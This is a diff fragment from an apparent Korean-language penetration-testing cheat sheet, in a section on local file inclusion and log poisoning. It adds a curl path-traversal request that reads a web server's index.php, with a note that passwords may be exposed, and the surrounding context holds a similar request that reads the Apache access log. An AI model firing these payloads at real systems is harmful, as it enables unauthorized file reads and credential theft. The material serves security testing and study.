@@ -29,6 +29,10 @@
 ---
 
 # 📄 Local File Inclusion (LFI) - Log Poisoning
+```bash
+curl http://example.com/index.php?page=../../../../../../../../../var/www/html/index.php
+```
+- 내부 파일을 읽을 수 있을 때 확인해보기.(패스워드가 노출될 수도 있음.)
 
 ```bash
 curl https://example.com/index.php?page=../../../../../../../../../var/log/apache2/access.log
